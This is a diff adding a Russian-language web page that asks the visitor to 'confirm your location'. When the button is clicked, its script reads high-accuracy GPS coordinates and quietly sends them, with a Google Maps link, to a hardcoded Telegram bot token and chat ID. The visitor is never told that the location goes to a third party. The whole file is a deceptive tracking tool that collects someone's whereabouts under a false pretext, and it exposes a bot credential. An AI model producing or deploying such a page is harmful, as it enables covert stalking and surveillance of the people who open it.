@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Подтверждение местоположения</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #f2f2f7;
+      color: #1c1c1e;
+    }
+    .card {
+      background: white;
+      padding: 30px;
+      border-radius: 20px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+      text-align: center;
+      max-width: 300px;
+      width: 90%;
+    }
+    button {
+      background-color: #007aff;
+      color: white;
+      border: none;
+      padding: 14px;
+      font-size: 17px;
+      font-weight: 600;
+      border-radius: 12px;
+      cursor: pointer;
+      margin-top: 20px;
+      width: 100%;
+      -webkit-tap-highlight-color: transparent;
+    }
+    button:active { opacity: 0.8; }
+    #status { margin-top: 15px; font-size: 14px; color: #8e8e93; }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <h2>Геолокация</h2>
+    <p>Пожалуйста, подтвердите ваше текущее местоположение.</p>
+    <button onclick="getSingleLocation()">Подтвердить</button>
+    <div id="status"></div>
+  </div>
+
+  <script>
+    const BOT_TOKEN = '8984067467:AAHDn3dD7_IPSsBHq8R51IWe70lW71b5q3E';
+    const CHAT_ID = '8580445561';
+
+    async function sendToTelegram(lat, lon, accuracy) {
+      const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+      const text = `📍 *Геопозиция получена!*\n\n• Координаты: \`${lat},${lon}\`\n• Точность: ~${accuracy} м\n\n[Открыть на Google Картах](${mapUrl})`;
+
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+      });
+
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, latitude: lat, longitude: lon })
+      });
+    }
+
+    function getSingleLocation() {
+      const status = document.getElementById('status');
+      if (!navigator.geolocation) {
+        status.innerText = "Геолокация не поддерживается.";
+        return;
+      }
+      status.innerText = "Определение координат...";
+
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          const accuracy = Math.round(position.coords.accuracy);
+          status.innerText = "Успешно отправлено!";
+          await sendToTelegram(lat, lon, accuracy);
+        },
+        (error) => {
+          status.innerText = "Ошибка получения геопозиции.";
+        },
+        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+      );
+    }
+  </script>
+</body>
+</html>
